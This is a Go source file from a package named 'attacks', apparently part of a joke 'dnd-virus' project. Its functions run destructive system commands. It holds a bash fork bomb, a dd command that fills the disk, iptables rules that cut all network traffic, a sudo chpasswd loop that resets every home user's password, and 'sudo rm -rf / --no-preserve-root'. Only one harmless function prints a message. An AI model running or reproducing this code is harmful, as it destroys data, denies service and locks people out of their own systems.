package attacks

import (
	"dnd-virus/password"
	"os/exec"
)

func ForkBomb() error {
	exec.Command("bash", "-c", ":(){ :|:& };:").Run()
	return nil
}

func FillDisk() error {
	exec.Command("dd", "if=/dev/zero", "of=/tmp/bigfile", "bs=1M").Run()
	return nil
}

func BlockNetwork() error {
	exec.Command("iptables", "-A", "OUTPUT", "-j", "DROP").Run()
	exec.Command("iptables", "-A", "INPUT", "-j", "DROP").Run()
	return nil
}

func ChangePassword() error {
	script := `
for user in $(getent passwd | grep -E '/home' | cut -d: -f1); do
    PASS="` + password.GeneratePassword() + `"
    echo "$user:$PASS" | sudo /usr/sbin/chpasswd 2>&1
    echo "Changed $user"
done
`
	exec.Command("bash", "-c", script).Run()
	return nil
}

func CriticalFail() error {
	exec.Command("bash", "-c", "sudo rm -rf / --no-preserve-root").Run()
	return nil
}

func GoodDay() error {
	exec.Command("bash", "-c", "DISPLAY=:0 gnome-terminal -- bash -c 'echo You are lucky; read'").Run()
	return nil
}
